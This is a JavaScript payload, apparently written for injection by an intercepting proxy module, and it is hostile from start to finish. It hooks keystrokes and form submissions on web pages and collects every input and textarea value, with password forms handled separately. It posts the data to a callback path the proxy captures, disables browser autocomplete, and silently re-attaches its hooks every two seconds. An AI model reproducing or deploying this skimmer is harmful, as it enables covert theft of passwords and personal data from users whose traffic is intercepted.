/*
  Hooks the keyup event and onsubmit events of forms and disables form autocompletion.

  Remember that any occurrence of 'obf_path_ssl_log', 'obf_path_callback' and
  'obf_path_whitelist' in this payload will be replaced when the proxy module
  loads and that variable names 'obf_var_target_hosts' and 'obf_var_replacement_hosts'
  are already declared before this is injected.
*/

function obf_func_random_string(obf_var_length) {
  var obf_var_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
      obf_var_buff  = new Array(obf_var_length);
  for (obf_var_i = 0; obf_var_i < obf_var_length; obf_var_i++) {
    obf_var_buff[obf_var_i] = obf_var_chars.charAt(parseInt(Math.random() * obf_var_chars.length));
  }
  return obf_var_buff.join("");
}

function obf_func_callback() {
  try {
    obf_var_inputs = document.getElementsByTagName("input");
    obf_var_textareas = document.getElementsByTagName("textarea");
    obf_var_params = "";

    for (obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
      if (obf_var_inputs[obf_var_i].value != "") {
        obf_var_params += encodeURIComponent(obf_var_inputs[obf_var_i].name) +
          "=" + encodeURIComponent(obf_var_inputs[obf_var_i].value) +
          (obf_var_i < (obf_var_inputs.length-1) ? "&" : "");
      }
    }
    for (obf_var_i = 0; obf_var_i < obf_var_textareas.length; obf_var_i++) {
      if (obf_var_textareas[obf_var_i].value != "") {
        obf_var_params += encodeURIComponent(obf_var_textareas[obf_var_i].name) +
          "=" + encodeURIComponent(obf_var_textareas[obf_var_i].value) +
          (obf_var_i < (obf_var_textareas.length-1) ? "&" : "");
      }
    }

    if (obf_var_params.length > 0) {
      obf_var_req = new XMLHttpRequest();
      obf_var_req.open(
        "POST",
        "http://" + location.host + "obf_path_callback?" + obf_var_params,
        true);
      obf_var_req.send();
    }
  } catch(obf_var_ignore){}
}

function obf_func_callback_whitelist() {
  try {
    obf_var_inputs = document.getElementsByTagName("input");
    obf_var_textareas = document.getElementsByTagName("textarea");
    obf_var_params = "";

    for (var obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
      if (obf_var_inputs[obf_var_i].value != "") {
        obf_var_params += encodeURIComponent(obf_var_inputs[obf_var_i].name) +
          "=" + encodeURIComponent(obf_var_inputs[obf_var_i].value) +
          (obf_var_i < (obf_var_inputs.length-1) ? "&" : "");
      }
    }
    for (var obf_var_i = 0; obf_var_i < obf_var_textareas.length; obf_var_i++) {
      if (obf_var_textareas[obf_var_i].value != "") {
        obf_var_params += encodeURIComponent(obf_var_textareas[obf_var_i].name) +
          "=" + encodeURIComponent(obf_var_textareas[obf_var_i].value) +
          (obf_var_i < (obf_var_textareas.length-1) ? "&" : "");
      }
    }

    if (obf_var_params.length > 0) {
      obf_var_req = new XMLHttpRequest();
      obf_var_req.open(
        "POST",
        "http://" + location.host + "obf_path_whitelist?" + obf_var_params,
        true);
      obf_var_req.send();
    }
  } catch(obf_var_ignore){}
}

function obf_func_hook_keyup() {
  globalThis.addEventListener("keyup", function(obf_var_event) {
    try {
      if (obf_var_event.target.tagName.match(/INPUT|TEXTAREA/)) {
        obf_func_callback();
      }
    } catch(obf_var_ignore){}
  });
}

function obf_func_hook_forms() {
  document.querySelectorAll("form").forEach(function(obf_var_form){
    if (obf_var_form.querySelector("input[type=password]")) {
      obf_var_form.addEventListener("submit", obf_func_callback_whitelist);
    } else {
      obf_var_form.addEventListener("submit", obf_func_callback);
    }
  });
}

function obf_func_hook_inputs() {
  document.querySelectorAll("input").forEach(function(obf_var_input){
    obf_var_input.autocomplete = "off";
  });
}

obf_var_hooked_tag = obf_func_random_string(parseInt(8 + Math.random() * 8));

try {
  obf_func_hook_keyup();
} catch(obf_var_ignore){}

try {
  obf_func_hook_forms();
} catch(obf_var_ignore){}

try {
  obf_func_hook_inputs();
} catch(obf_var_ignore){}

try {
  document.addEventListener("DOMContentLoaded", obf_func_hook_forms);
  document.addEventListener("DOMContentLoaded", obf_func_hook_inputs);
} catch(obf_var_ignore) {}

try {
  globalThis.addEventListener("load", obf_func_hook_forms);
  globalThis.addEventListener("load", obf_func_hook_inputs);
  setInterval(obf_func_hook_forms, 2000);
  setInterval(obf_func_hook_inputs, 2000);
} catch(obf_var_ignore){}

